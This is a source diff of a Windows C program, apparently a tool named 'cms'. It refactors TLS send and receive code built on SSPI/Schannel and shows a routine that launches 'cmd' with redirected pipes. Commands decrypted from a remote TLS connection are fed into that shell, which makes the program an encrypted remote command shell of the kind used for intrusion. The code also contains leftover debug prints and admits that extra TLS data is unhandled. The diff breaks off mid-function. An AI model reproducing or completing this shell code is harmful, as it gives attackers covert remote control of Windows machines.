@@ -42,15 +42,15 @@
 #pragma comment(lib, "user32.lib")
 #pragma comment(lib, "shlwapi.lib")
 
-PBYTE                  pbIoBuffer;
-DWORD                  cbIoBufferLength;
+PBYTE                  pbBufferIn, pbBufferOut;
+PBYTE                  pbDataIn, pbDataOut;
+DWORD                  cbDataIn, cbDataOut;
+
+DWORD                  cbBufferLen, timeout=1000*5;
 SCHANNEL_CRED          SchannelCred;
 PSecurityFunctionTable sspi;
 SECURITY_STATUS        ss;
 TimeStamp              ts;
-
-PBYTE pbData;
-DWORD cbData;
 
 CredHandle hClientCreds;
 CtxtHandle hContext;
@@ -59,26 +59,14 @@ struct sockaddr_in sin;
 struct hostent     *hp;
 WSADATA            wsa;
 
-#define RSA_KEY_XCHG 1
-#define DHE_KEY_XCHG 2
-
 #define DEFAULT_PORT "443"
 
-#define SERVER_MODE 0
-#define CLIENT_MODE 1
-
 typedef struct _CMD_ARGS {
-  int    xchg_type;       // key exchange type
-  DWORD  xchg_len;        // key exchange length
-  int    enc_nbr;         // encryption index as integer
-  ALG_ID enc_id;          //
   char   *port;           // port number as string
   int    port_nbr;        // port number as integer
   char   *address;        // local or remote address as IP or host name
-  int    mode;            // server or client mode
   int    secure;          // security is enabled by default but can be switched off with -s
   int    ai_family;       // AF_INET or AF_INET6
-  int    list_prov;
 } CMD_ARGS;
 
 DWORD       dwProtocol = SP_PROT_TLS1; // SP_PROT_TLS1; // SP_PROT_PCT1; SP_PROT_SSL2; SP_PROT_SSL3; 0=default
@@ -104,25 +92,151 @@ int ai_addrlen;
 struct sockaddr *ai_addr;
 
 // display windows error message
-void xstrerror (const char fmt[], ...) 
-{
-  char    *error;
+void xstrerror (char *fmt, ...) {
+  char    *error=NULL;
   va_list arglist;
   char    buffer[2048];
+  DWORD   dwError=GetLastError();
   
   va_start (arglist, fmt);
   wvnsprintf (buffer, sizeof(buffer) - 1, fmt, arglist);
   va_end (arglist);
   
-  FormatMessage (
+  if (FormatMessage (
       FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
-      NULL, GetLastError (), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
-      (LPSTR)&error, 0, NULL);
-
-  printf ("  [ %s : %s\n", buffer, error);
-  LocalFree (error);
+      NULL, dwError, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
+      (LPSTR)&error, 0, NULL))
+  {
+    printf ("  [ %s : %s\n", buffer, error);
+    LocalFree (error);
+  } else {
+    printf ("  [ %s : %i\n", buffer, dwError);
+  }
 }
 
+// encrypt and send data to remote system
+SECURITY_STATUS ssl_send (void)
+{
+  SecBufferDesc  msg;
+  SecBuffer      sb[4];
+  
+  // stream header
+  sb[0].pvBuffer   = pbBufferOut; 
+  sb[0].cbBuffer   = Sizes.cbHeader; 
+  sb[0].BufferType = SECBUFFER_STREAM_HEADER;
+
+  // stream data
+  sb[1].pvBuffer   = pbBufferOut + Sizes.cbHeader;
+  sb[1].cbBuffer   = cbDataOut; 
+  sb[1].BufferType = SECBUFFER_DATA; 
+  
+  // stream trailer
+  sb[2].pvBuffer   = pbBufferOut + Sizes.cbHeader + cbDataOut; 
+  sb[2].cbBuffer   = Sizes.cbTrailer; 
+  sb[2].BufferType = SECBUFFER_STREAM_TRAILER; 
+
+  sb[3].pvBuffer   = SECBUFFER_EMPTY; 
+  sb[3].cbBuffer   = SECBUFFER_EMPTY; 
+  sb[3].BufferType = SECBUFFER_EMPTY;
+
+  msg.ulVersion    = SECBUFFER_VERSION; 
+  msg.cBuffers     = 4;
+  msg.pBuffers     = sb; 
+  
+  // encrypt
+  ss = sspi->EncryptMessage (&hContext, 0, &msg, 0);
+  
+  // send
+  if (ss==SEC_E_OK) {
+    send (s, pbBufferOut, sb[0].cbBuffer + sb[1].cbBuffer + sb[2].cbBuffer, 0);
+  }
+  return ss;
+}
+
+SECURITY_STATUS ssl_recv (void)
+{
+  SecBufferDesc  msg;
+  SecBuffer      sb[4];
+  DWORD          cbIoBuffer=0;
+  SecBuffer      *pData=NULL, *pExtra=NULL;
+  int            len, i;
+  ss=SEC_E_INCOMPLETE_MESSAGE;
+  
+  do
+  {
+    if (cbIoBuffer==0 || ss==SEC_E_INCOMPLETE_MESSAGE)
+    {
+      len = recv (s, pbDataIn + cbIoBuffer, cbBufferLen - cbIoBuffer, 0);
+      if (len<=0) break;
+      
+      cbIoBuffer += len;
+      
+      sb[0].pvBuffer   = pbDataIn;
+      sb[0].cbBuffer   = cbIoBuffer;
+    
+      sb[0].BufferType = SECBUFFER_DATA;
+      sb[1].BufferType = SECBUFFER_EMPTY;
+      sb[2].BufferType = SECBUFFER_EMPTY;
+      sb[3].BufferType = SECBUFFER_EMPTY;
+
+      msg.ulVersion    = SECBUFFER_VERSION;
+      msg.cBuffers     = 4;
+      msg.pBuffers     = sb;
+    
+      ss = sspi->DecryptMessage (&hContext, &msg, 0, NULL);
+    
+      if (ss == SEC_I_CONTEXT_EXPIRED) break;
+    
+      for (i=0; i<4; i++) {
+        if (pData==NULL && sb[i].BufferType==SECBUFFER_DATA) pData=&sb[i];
+        if (pExtra==NULL && sb[i].BufferType==SECBUFFER_EXTRA) pExtra=&sb[i];
+      }
+      
+      if (pData!=NULL)
+      {
+        cbDataIn=pData->cbBuffer;
+        if (cbDataIn!=0)
+        {
+          memcpy (pbDataIn, pData->pvBuffer, cbDataIn);
+          break;
+        }
+      }
+    }
+  } while (1);
+  return SEC_E_OK;
+}
+
+// create credentials
+SECURITY_STATUS create_creds (void)   
+{
+  DWORD  cSupportedAlgs = 0;
+  ALG_ID rgbSupportedAlgs[16];
+  
+  ZeroMemory (&SchannelCred, sizeof (SchannelCred));
+
+  SchannelCred.dwVersion             = SCHANNEL_CRED_VERSION;
+  SchannelCred.grbitEnabledProtocols = SP_PROT_SSL3 | SP_PROT_TLS1;
+
+  if (aiKeyExch) { 
+    rgbSupportedAlgs[cSupportedAlgs++] = aiKeyExch;
+  }
+  
+  if (cSupportedAlgs) {
+    SchannelCred.cSupportedAlgs    = cSupportedAlgs;
+    SchannelCred.palgSupportedAlgs = rgbSupportedAlgs;
+  }
+
+  SchannelCred.dwFlags |= SCH_CRED_NO_DEFAULT_CREDS;
+  // We need manual validation
+  SchannelCred.dwFlags |= SCH_CRED_MANUAL_CRED_VALIDATION;
+  
+  ss = sspi->AcquireCredentialsHandleA (NULL, UNISP_NAME_A, 
+            SECPKG_CRED_OUTBOUND, NULL, &SchannelCred, NULL, 
+            NULL, &hClientCreds, &ts);
+  return ss;
+}
+
+// Initiate a ClientHello message and generate a token.
 SECURITY_STATUS chs_hello (void)
 {
   DWORD         dwFlagsIn, dwFlagsOut;
@@ -136,7 +250,6 @@ SECURITY_STATUS chs_hello (void)
               ISC_REQ_ALLOCATE_MEMORY | 
               ISC_REQ_STREAM;
 
-  //  Initiate a ClientHello message and generate a token.
   sb[0].pvBuffer   = NULL;
   sb[0].BufferType = SECBUFFER_TOKEN;
   sb[0].cbBuffer   = 0;
@@ -148,16 +261,18 @@ SECURITY_STATUS chs_hello (void)
   ss = sspi->InitializeSecurityContextA (&hClientCreds, NULL, pszServer, dwFlagsIn, 
               0, SECURITY_NATIVE_DREP, NULL, 0, &hContext, &hs, &dwFlagsOut, &ts);
 
-  if (ss!=SEC_I_CONTINUE_NEEDED) {
-    return ss;
-  }
-  if (sb[0].cbBuffer != 0) {
-    send (s, sb[0].pvBuffer, sb[0].cbBuffer, 0);
-    ss = sspi->FreeContextBuffer (sb[0].pvBuffer);
+  // should indicate continuing
+  if (ss==SEC_I_CONTINUE_NEEDED) {
+    // send data
+    if (sb[0].cbBuffer != 0) {
+      send (s, sb[0].pvBuffer, sb[0].cbBuffer, 0);
+      ss = sspi->FreeContextBuffer (sb[0].pvBuffer);
+    }
   }
   return ss;
 }
 
+// perform SSL handshake with remote system
 SECURITY_STATUS chs (void)
 {
   DWORD         dwFlagsIn, dwFlagsOut;
@@ -168,6 +283,8 @@ SECURITY_STATUS chs (void)
   int           len;
   BOOL          bRead=TRUE;
   
+  // 8192 should be enough for handshake but
+  // if you see any errors, try increasing it.
   IoBuffer = LocalAlloc (LMEM_FIXED, 8192);
   
   if ((ss=chs_hello())!=SEC_E_OK) {
@@ -191,6 +308,7 @@ SECURITY_STATUS chs (void)
       {
         len=recv (s, &IoBuffer[cbIoBuffer], 8192, 0);
       
+        // some socket error
         if (len<=0) {
           break;
         }
@@ -224,11 +342,7 @@ SECURITY_STATUS chs (void)
       NULL, dwFlagsIn, 0, SECURITY_NATIVE_DREP, &in, 0, NULL, 
       &out, &dwFlagsOut, &ts);
     
-    if (ss==SEC_E_ILLEGAL_MESSAGE) {
-      ss=SEC_I_CONTINUE_NEEDED;
-      cbIoBuffer=0;
-      continue;
-    }
+    // might get SEC_E_ILLEGAL_MESSAGE here
     
     if (ss==SEC_E_OK || 
         ss==SEC_I_CONTINUE_NEEDED ||
@@ -237,6 +351,7 @@ SECURITY_STATUS chs (void)
       if (ob[0].cbBuffer != 0) {
         len=send (s, ob[0].pvBuffer, ob[0].cbBuffer, 0);
       
+        // socket error
         if (len<=0) {
           break;
         }
@@ -244,10 +359,12 @@ SECURITY_STATUS chs (void)
         sspi->FreeContextBuffer (ob[0].pvBuffer);
       }
     }
+    
     if (ss==SEC_E_INCOMPLETE_MESSAGE) continue;
+    
     if (ss==SEC_E_OK) {
       if (ib[1].BufferType==SECBUFFER_EXTRA) {
-        printf ("\n extra data available");
+        // i don't handle extra data here but it should be.
       }
       break;
     }      
@@ -264,13 +381,6 @@ SECURITY_STATUS chs (void)
   return ss;
 }
 
-// create credentials
-// connect to server
-// perform client handshake
-// run cmd
-// disconnect from server
-// 
-
 // convert binary network address to string
 char *addr2ip (void)
 {
@@ -279,11 +389,7 @@ char *addr2ip (void)
   return (char*)ip;
 }
 
-/**
- *
- * sets the width of console buffer
- *
- */
+// sets the width of console buffer
 VOID setw (SHORT X) {
   CONSOLE_SCREEN_BUFFER_INFO csbi;
   GetConsoleScreenBufferInfo (GetStdHandle(STD_OUTPUT_HANDLE), &csbi);
@@ -293,11 +399,7 @@ VOID setw (SHORT X) {
   SetConsoleScreenBufferSize (GetStdHandle(STD_OUTPUT_HANDLE), csbi.dwSize);
 }
 
-/**
- *
- * Resolve host, create socket and event handle associated with it
- *
- */ 
+// Resolve host, create socket and event handle associated with it 
 BOOL open_tcp (void)
 {
   struct addrinfo *list, *e;
@@ -344,11 +446,116 @@ BOOL open_tcp (void)
   return bStatus;
 }
 
-/**
- *
- * shut down socket, close event handle, clean up
- *
- */ 
+SECURITY_STATUS ReadDecrypt (void)
+
+// calls recv() - blocking socket read
+// http://msdn.microsoft.com/en-us/library/ms740121(VS.85).aspx
+
+// The encrypted message is decrypted in place, overwriting the original contents of its buffer.
+// http://msdn.microsoft.com/en-us/library/aa375211(VS.85).aspx
+
+{
+  SecBuffer       ExtraBuffer;
+  SecBuffer       *pDataBuffer, *pExtraBuffer;
+
+  SECURITY_STATUS scRet;            // unsigned long cbBuffer;    // Size of the buffer, in bytes
+  SecBufferDesc   Message;        // unsigned long BufferType;  // Type of the buffer (below)
+  SecBuffer       Buffers[4];    // void    SEC_FAR * pvBuffer;   // Pointer to the buffer
+
+  DWORD           cbIoBuffer, cbData, length;
+  PBYTE           buff;
+  int             i;
+
+  // Read data from server until done.
+  cbIoBuffer = 0;
+  scRet = 0;
+  
+  while(TRUE) // Read some data.
+  {
+    if( cbIoBuffer == 0 || scRet == SEC_E_INCOMPLETE_MESSAGE ) // get the data
+    {
+      cbDataIn = recv(s, pbBufferIn + cbIoBuffer, cbBufferLen - cbIoBuffer, 0);
+      if(cbDataIn == SOCKET_ERROR)
+      {
+        printf("**** Error %d reading data from server\n", WSAGetLastError());
+        scRet = SEC_E_INTERNAL_ERROR;
+        break;
+      }
+      else if(cbDataIn == 0) // Server disconnected.
+      {
+        if(cbIoBuffer)
+        {
+          printf("**** Server unexpectedly disconnected\n");
+          scRet = SEC_E_INTERNAL_ERROR;
+          return scRet;
+        }
+        else
+        break; // All Done
+      }
+      else // success
+      {
+        cbIoBuffer += cbDataIn;
+      }
+    }
+
+    // Decrypt the received data.
+    Buffers[0].pvBuffer     = pbBufferIn;
+    Buffers[0].cbBuffer     = cbIoBuffer;
+    Buffers[0].BufferType   = SECBUFFER_DATA;  // Initial Type of the buffer 1
+    Buffers[1].BufferType   = SECBUFFER_EMPTY; // Initial Type of the buffer 2
+    Buffers[2].BufferType   = SECBUFFER_EMPTY; // Initial Type of the buffer 3
+    Buffers[3].BufferType   = SECBUFFER_EMPTY; // Initial Type of the buffer 4
+
+    Message.ulVersion       = SECBUFFER_VERSION;    // Version number
+    Message.cBuffers        = 4;                                    // Number of buffers - must contain four SecBuffer structures.
+    Message.pBuffers        = Buffers;                        // Pointer to array of buffers
+    
+    scRet = sspi->DecryptMessage(&hContext, &Message, 0, NULL);
+    
+    if( scRet == SEC_I_CONTEXT_EXPIRED ) break; // Server signalled end of session
+    
+    //      if( scRet == SEC_E_INCOMPLETE_MESSAGE - Input buffer has partial encrypted record, read more
+    if( scRet != SEC_E_OK &&
+        scRet != SEC_I_RENEGOTIATE &&
+        scRet != SEC_I_CONTEXT_EXPIRED )
+    { printf("**** DecryptMessage ");
+      return scRet; }
+
+    // Locate data and (optional) extra buffers.
+    pDataBuffer  = NULL;
+    pExtraBuffer = NULL;
+    
+    for(i = 1; i < 4; i++)
+    {
+      if( pDataBuffer  == NULL && Buffers[i].BufferType == SECBUFFER_DATA  ) pDataBuffer  = &Buffers[i];
+      if( pExtraBuffer == NULL && Buffers[i].BufferType == SECBUFFER_EXTRA ) pExtraBuffer = &Buffers[i];
+    }
+
+    if (pDataBuffer!=NULL)
+    {
+      cbDataIn=pDataBuffer->cbBuffer;
+      if (cbDataIn!=0)
+      {
+        memcpy (pbDataIn, pDataBuffer->pvBuffer, cbDataIn);
+      }
+    }
+      
+    // Move any "extra" data to the input buffer.
+    if(pExtraBuffer)
+    {
+      printf ("extra");
+      MoveMemory(pbBufferIn, pExtraBuffer->pvBuffer, pExtraBuffer->cbBuffer);
+      cbIoBuffer = pExtraBuffer->cbBuffer; // printf("cbIoBuffer= %d  \n", cbIoBuffer);
+    }
+    else
+    cbIoBuffer = 0;
+  printf ("\nhello");
+  }
+
+  return SEC_E_OK;
+}
+
+// shut down socket, close event handle, clean up
 void close_tcp (void)
 {
   // disable send/receive operations
@@ -357,136 +564,6 @@ void close_tcp (void)
   closesocket (s);
   // clean up
   WSACleanup();
-}
-
-char* getparam (int argc, char *argv[], int *i)
-{
-  int n=*i;
-  if (argv[n][2] != 0) {
-    return &argv[n][2];
-  }
-  if ((n+1) < argc) {
-    *i=n+1;
-    return argv[n+1];
-  }
-  printf ("  [ %c%c requires parameter\n", argv[n][0], argv[n][1]);
-  exit (0);
-}
-
-void usage (void) 
-{ 
-  int i;
-  
-  printf ("\n  usage: cms <address> [options]\n");
-  printf ("\n  -6           Use IP version 6");
-  printf ("\n  -p <number>  Port number to use (default is 443)");
-  printf ("\n  -x <number>  Key Exchange : 1=RSA (default), 2=DHE");
-  printf ("\n\n  Press any key to continue . . .");
-  getchar ();
-  exit (0);
-}
-
-// parse the arguments on command line
-void parse_args (int argc, char *argv[])
-{
-  int  i;
-  char opt;
-  
-  // for each argument
-  for (i=1; i<argc; i++)
-  {
-    // is this option?
-    if (argv[i][0]=='-' || argv[i][1]=='/')
-    {
-      // get option value
-      opt=argv[i][1];
-      switch (opt)
-      {
-        case 'a':
-          args.list_prov=1;
-          break;
-        case '4':
-          args.ai_family=AF_INET;
-          break;
-        case '6':     // use ipv6 (default is ipv4)
-          args.ai_family=AF_INET6;
-          break;
-        case 'l':     // list provider types and algorithms
-          args.mode=SERVER_MODE;
-          break;
-        case 'p':     // port number
-          args.port=getparam(argc, argv, &i);
-          args.port_nbr=atoi(args.port);
-          break;
-        case 'x':     // key exchange type
-          args.xchg_type=atoi(getparam(argc, argv, &i));
-          break;
-        case 'k':     // key exchange length 
-          args.xchg_len=atoi(getparam(argc, argv, &i));
-          args.xchg_len=args.xchg_len==1 ? 1024 : 2048;
-          break;
-        case 'e':     // encryption index
-          args.enc_nbr=atoi(getparam(argc,  argv, &i));
-          break;
-        case 's':     // no encryption (on by default)
-          args.secure=0;
-          break;
-        case '?':     // display usage
-        case 'h':
-          usage ();
-          break;
-        default:
-          printf ("  [ unknown option %c\n", opt);
-          break;
-      }
-    } else {
-      // assume it's hostname or ip
-      args.address=argv[i];
-    }
-  }
-}
-
-int validate_args (void)
-{
-  // validate selected key exchange
-  if (args.xchg_type!=RSA_KEY_XCHG && args.xchg_type!=DHE_KEY_XCHG) {
-    printf ("  [ Valid key exchange values are %i (RSA) and %i (DHE)\n",
-      RSA_KEY_XCHG, DHE_KEY_XCHG);
-    return 0;
-  }
-  
-  // validate port
-  // port numbers should be 0 > port < 65535
-  if (!(args.port_nbr>=1 && args.port_nbr<=65535)) {
-    printf ("  [ Invalid port, choose from 1-65535\n");
-    return 0;
-  }
-  
-  // validate key length
-  if (args.xchg_len!=1024 && args.xchg_len!=2048) {
-    printf ("  [ Invalid key length specified, choose 1 (1024) or 2 (2048)\n");
-    return 0;
-  }
-  
-  // server or client mode?
-  if (args.mode==CLIENT_MODE && args.address==NULL) {
-    printf ("  [ No host specified\n");
-    return 0;
-  }
-  return 1;
-}
-
-void display_args (void)
-{
-  printf ("  [ %s mode using IPv%i\n", 
-    args.mode==SERVER_MODE ? "Server" : "Client",
-    args.ai_family==AF_INET ? 4:6);
-    
-  printf ("  [ %s-%i key exchange\n", 
-    args.xchg_type==RSA_KEY_XCHG?"RSA":"DHE", 
-    args.xchg_len);
-    
-  printf ("  [ Address is %s\n", addr2ip());
 }
 
 BOOL WINAPI HandlerRoutine (DWORD dwCtrlType)
@@ -511,235 +588,57 @@ void stop_handler (void)
   evt_cnt--;
 }
 
-SECURITY_STATUS ssl_send (void)
+typedef struct _ALG_INFO {
+  ALG_ID id;
+  char *s;
+} ALG_INFO;
+
+ALG_INFO algos[]=
 {
-  SecBufferDesc  msg;
-  SecBuffer      sb[4];
-  
-  // stream header
-  sb[0].pvBuffer   = pbIoBuffer; 
-  sb[0].cbBuffer   = Sizes.cbHeader; 
-  sb[0].BufferType = SECBUFFER_STREAM_HEADER;
+  // protocols
+  {SP_PROT_TLS1_CLIENT, "TLS1"},
+  {SP_PROT_PCT1_CLIENT, "PCT1"},
+  {SP_PROT_SSL2_CLIENT, "SSL2"},
+  {SP_PROT_SSL3_CLIENT, "SSL3"},
+  // ciphers
+  {CALG_RC2,     "RC2"        },
+  {CALG_RC4,     "RC4"        },
+  {CALG_DES,     "DES"        },
+  {CALG_3DES,   "3DES"        },
+  {CALG_AES_128, "AES"        },
+  {CALG_AES_192, "AES"        },
+  {CALG_AES_256, "AES"        },
+  // hash
+  {CALG_MD5,      "MD5"       },
+  {CALG_SHA,      "SHA"       },
+  // key exchange
+  {CALG_RSA_KEYX, "RSA"       },
+  {CALG_DH_EPHEM, "DHE"       },
+  {CALG_ECDH,     "ECDH"      },
+  {CALG_ECMQV,    "ECMQV"     },
+};
 
-  // stream data
-  sb[1].pvBuffer   = pbIoBuffer + Sizes.cbHeader;
-  sb[1].cbBuffer   = cbData; 
-  sb[1].BufferType = SECBUFFER_DATA; 
-  
-  // stream trailer
-  sb[2].pvBuffer   = pbIoBuffer + Sizes.cbHeader + cbData; 
-  sb[2].cbBuffer   = Sizes.cbTrailer; 
-  sb[2].BufferType = SECBUFFER_STREAM_TRAILER; 
-
-  sb[3].pvBuffer   = SECBUFFER_EMPTY; 
-  sb[3].cbBuffer   = SECBUFFER_EMPTY; 
-  sb[3].BufferType = SECBUFFER_EMPTY;
-
-  msg.ulVersion    = SECBUFFER_VERSION; 
-  msg.cBuffers     = 4;
-  msg.pBuffers     = sb; 
-  
-  ss = sspi->EncryptMessage (&hContext, 0, &msg, 0);
-  
-  send (s, pbIoBuffer, sb[0].cbBuffer + sb[1].cbBuffer + sb[2].cbBuffer, 0);
-  return ss;
-}
-
-SECURITY_STATUS ssl_recv (void)
+char *alg2s (ALG_ID id)
 {
-  SecBufferDesc  msg;
-  SecBuffer      sb[4];
-  DWORD          cbIoBuffer=0;
-  SecBuffer      *pData=NULL, *pExtra=NULL;
-  int            len, i;
-  ss=SEC_E_INCOMPLETE_MESSAGE;
-  
-  do
-  {
-    if (cbIoBuffer==0 || ss==SEC_E_INCOMPLETE_MESSAGE)
-    {
-      len = recv (s, pbData + cbIoBuffer, BUFSIZ, 0);
-      if (len<=0) break;
-      
-      cbIoBuffer += len;
-      
-      sb[0].pvBuffer   = pbData;
-      sb[0].cbBuffer   = cbIoBuffer;
-    
-      sb[0].BufferType = SECBUFFER_DATA;
-      sb[1].BufferType = SECBUFFER_EMPTY;
-      sb[2].BufferType = SECBUFFER_EMPTY;
-      sb[3].BufferType = SECBUFFER_EMPTY;
-
-      msg.ulVersion    = SECBUFFER_VERSION;
-      msg.cBuffers     = 4;
-      msg.pBuffers     = sb;
-    
-      ss = sspi->DecryptMessage (&hContext, &msg, 0, NULL);
-    
-      if (ss == SEC_I_CONTEXT_EXPIRED) break;
-    
-      for (i=0; i<4; i++) {
-        if (pData==NULL && sb[i].BufferType==SECBUFFER_DATA) pData=&sb[i];
-        if (pExtra==NULL && sb[i].BufferType==SECBUFFER_EXTRA) pExtra=&sb[i];
-      }
-      
-      if (pData!=NULL)
-      {
-        cbData=pData->cbBuffer;
-        if (cbData!=0)
-        {
-          memcpy (pbData, pData->pvBuffer, cbData);
-          break;
-        }
-      }
-    }
-  } while (1);
-  return SEC_E_OK;
-}
-
-// create credentials
-SECURITY_STATUS create_creds (void)   
-{
-  DWORD  cSupportedAlgs = 0;
-  ALG_ID rgbSupportedAlgs[16];
-  
-  ZeroMemory (&SchannelCred, sizeof (SchannelCred));
-
-  SchannelCred.dwVersion             = SCHANNEL_CRED_VERSION;
-  SchannelCred.grbitEnabledProtocols = SP_PROT_SSL3 | SP_PROT_TLS1;
-
-  if (aiKeyExch) { 
-    rgbSupportedAlgs[cSupportedAlgs++] = aiKeyExch;
+  int i;
+  for (i=0; i<sizeof(algos)/sizeof(ALG_INFO);i++) {
+    if (algos[i].id==id)
+      return algos[i].s;
   }
-  
-  if (cSupportedAlgs) {
-    SchannelCred.cSupportedAlgs    = cSupportedAlgs;
-    SchannelCred.palgSupportedAlgs = rgbSupportedAlgs;
-  }
-
-  SchannelCred.dwFlags |= SCH_CRED_NO_DEFAULT_CREDS;
-  // We need manual validation
-  SchannelCred.dwFlags |= SCH_CRED_MANUAL_CRED_VALIDATION;
-  
-  ss = sspi->AcquireCredentialsHandleA (NULL, UNISP_NAME_A, 
-            SECPKG_CRED_OUTBOUND, NULL, &SchannelCred, NULL, 
-            NULL, &hClientCreds, &ts);
-  return ss;
+  return "unrecognized";
 }
 
 void secure_info (void)
 {
-  SecPkgContext_ConnectionInfo ConnectionInfo;
+  SecPkgContext_ConnectionInfo ci;
 
-  ss = sspi->QueryContextAttributes (&hContext, SECPKG_ATTR_CONNECTION_INFO, (PVOID)&ConnectionInfo);
+  ss = sspi->QueryContextAttributes (&hContext, SECPKG_ATTR_CONNECTION_INFO, (PVOID)&ci);
   if(ss != SEC_E_OK) { printf("Error 0x%x querying connection info\n", ss); return; }
 
-  printf("\n");
-
-  switch(ConnectionInfo.dwProtocol)
-  {
-  case SP_PROT_TLS1_CLIENT:
-    printf("Protocol: TLS1\n");
-    break;
-
-  case SP_PROT_SSL3_CLIENT:
-    printf("Protocol: SSL3\n");
-    break;
-
-  case SP_PROT_PCT1_CLIENT:
-    printf("Protocol: PCT\n");
-    break;
-
-  case SP_PROT_SSL2_CLIENT:
-    printf("Protocol: SSL2\n");
-    break;
-
-  default:
-    printf("Protocol: 0x%x\n", ConnectionInfo.dwProtocol);
-  }
-
-  switch(ConnectionInfo.aiCipher)
-  {
-  case CALG_RC4:
-    printf("Cipher: RC4\n");
-    break;
-
-  case CALG_3DES:
-    printf("Cipher: Triple DES\n");
-    break;
-
-  case CALG_RC2:
-    printf("Cipher: RC2\n");
-    break;
-
-  case CALG_DES:
-  case CALG_CYLINK_MEK:
-    printf("Cipher: DES\n");
-    break;
-
-  case CALG_SKIPJACK:
-    printf("Cipher: Skipjack\n");
-    break;
-  case CALG_AES_128:
-  case CALG_AES_192:
-  case CALG_AES_256:
-    printf ("Cipher: AES\n");
-    break;
-  default:
-    printf("Cipher: 0x%x\n", ConnectionInfo.aiCipher);
-  }
-
-  printf("Cipher strength: %d\n", ConnectionInfo.dwCipherStrength);
-
-  switch(ConnectionInfo.aiHash)
-  {
-  case CALG_MD5:
-    printf("Hash: MD5\n");
-    break;
-
-  case CALG_SHA:
-    printf("Hash: SHA\n");
-    break;
-
-  default:
-    printf("Hash: 0x%x\n", ConnectionInfo.aiHash);
-  }
-
-  printf("Hash strength: %d\n", ConnectionInfo.dwHashStrength);
-
-  switch(ConnectionInfo.aiExch)
-  {
-  case CALG_RSA_KEYX:
-  case CALG_RSA_SIGN:
-    printf("Key exchange: RSA\n");
-    break;
-
-  case CALG_KEA_KEYX:
-    printf("Key exchange: KEA\n");
-    break;
-
-  case CALG_DH_SF:
-    printf ("DHSF");
-    break;
-  case CALG_DH_EPHEM:
-    printf("Key exchange: DH Ephemeral\n");
-    break;
-    
-  case CALG_ECDH:
-    printf ("Key exchange: ECDH\n");
-    break;
-  
-  case CALG_ECMQV:
-    printf ("Key exchange: ECMQV\n");
-    break;
-    
-  default:
-    printf("Key exchange: 0x%x\n",
-    ConnectionInfo.aiExch);
-  }
-
-  printf("Key exchange strength: %d\n", ConnectionInfo.dwExchStrength);
+  printf ("  [ Protocol : %s\n",      alg2s(ci.dwProtocol));
+  printf ("  [ Cipher   : %s-%i\n",   alg2s(ci.aiCipher), ci.dwCipherStrength);
+  printf ("  [ Hash     : %s-%i\n",   alg2s(ci.aiHash),   ci.dwHashStrength  );
+  printf ("  [ Exchange : %s-%i\n\n", alg2s(ci.aiExch),   ci.dwExchStrength  );
 }
 
 DWORD wait_evt (void)
@@ -748,12 +647,16 @@ DWORD wait_evt (void)
   u_long           off=0;
   DWORD            e;
   
+  // unblock socket
   WSAEventSelect (s, evt[sck_evt], FD_CLOSE | FD_READ | FD_ACCEPT);
-  e=WaitForMultipleObjects (evt_cnt, evt, FALSE, INFINITE);
+  
+  // wait for some event
+  e=WaitForMultipleObjects (evt_cnt, evt, FALSE, timeout);
 
   WSAEnumNetworkEvents (s, evt[sck_evt], &ne);    
   WSAEventSelect (s, evt[sck_evt], 0);
   
+  // block socket
   ioctlsocket (s, FIONBIO, &off);
   
   if (ne.lNetworkEvents & FD_CLOSE) {
@@ -762,6 +665,9 @@ DWORD wait_evt (void)
   return e;
 }
 
+#define R_PIPE 0
+#define W_PIPE 1
+
 void cmd (void) 
 {
   SECURITY_ATTRIBUTES sa;
@@ -769,7 +675,7 @@ void cmd (void)
   STARTUPINFO         si;
   OVERLAPPED          lap;
   
-  HANDLE              lh[4];
+  HANDLE              in[2], out[2];
   DWORD               p, e;
   
   sa.nLength              = sizeof (SECURITY_ATTRIBUTES);
@@ -778,27 +684,30 @@ void cmd (void)
   
   evt[stdout_evt = evt_cnt++] = CreateEvent (NULL, TRUE, TRUE, NULL);
   
-  if (CreatePipe (&lh[0], &lh[1], &sa, 0)) 
+  if (CreatePipe (&in[R_PIPE], &in[W_PIPE], &sa, 0)) 
   {  
-    lh[2] = CreateNamedPipe ("\\\\.\\pipe\\0", 
-        PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
-        PIPE_TYPE_BYTE     | PIPE_READMODE_BYTE | PIPE_WAIT, 
-        PIPE_UNLIMITED_INSTANCES, 0, 0, 0, NULL);
+    out[R_PIPE] = CreateNamedPipe ("\\\\.\\pipe\\0", 
+        PIPE_ACCESS_INBOUND | FILE_FLAG_OVERLAPPED,
+        PIPE_TYPE_BYTE      | PIPE_READMODE_BYTE | PIPE_WAIT, 
+        PIPE_UNLIMITED_INSTANCES, 0, 0, 0, &sa);
         
-    if (lh[2] != INVALID_HANDLE_VALUE) 
+    if (out[R_PIPE] != INVALID_HANDLE_VALUE) 
     {  
-      lh[3] = CreateFile ("\\\\.\\pipe\\0", MAXIMUM_ALLOWED, 
-          0, &sa, OPEN_EXISTING, 0, NULL);
+      out[W_PIPE] = CreateFile ("\\\\.\\pipe\\0", GENERIC_WRITE, 
+          0, &sa, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
       
-      if (lh[3] != INVALID_HANDLE_VALUE) 
+      if (out[W_PIPE] != INVALID_HANDLE_VALUE) 
       {
         ZeroMemory (&si, sizeof (si));
         ZeroMemory (&pi, sizeof (pi));
 
+        SetHandleInformation (in[W_PIPE], HANDLE_FLAG_INHERIT, 0);
+        SetHandleInformation (out[R_PIPE], HANDLE_FLAG_INHERIT, 0);
+        
         si.cb              = sizeof (si);
-        si.hStdInput       = lh[0];
-        si.hStdError       = lh[3];
-        si.hStdOutput      = lh[3];
+        si.hStdInput       = in[R_PIPE];
+        si.hStdError       = out[W_PIPE];
+        si.hStdOutput      = out[W_PIPE];
         si.dwFlags         = STARTF_USESTDHANDLES;
         
         if (CreateProcess (NULL, "cmd", NULL, NULL, TRUE, 
@@ -829,50 +738,129 @@ void cmd (void)
             // is this socket event?
             if (e == sck_evt) 
             {
-              if (ssl_recv () != SEC_E_OK) 
+              if (ReadDecrypt () != SEC_E_OK) 
                 break;
               
-              WriteFile (lh[1], pbData, cbData, &cbData, 0);
+              WriteFile (in[W_PIPE], pbDataIn, cbDataIn, &cbDataIn, 0);
               p--;  // we're ready to read again.              
             } else
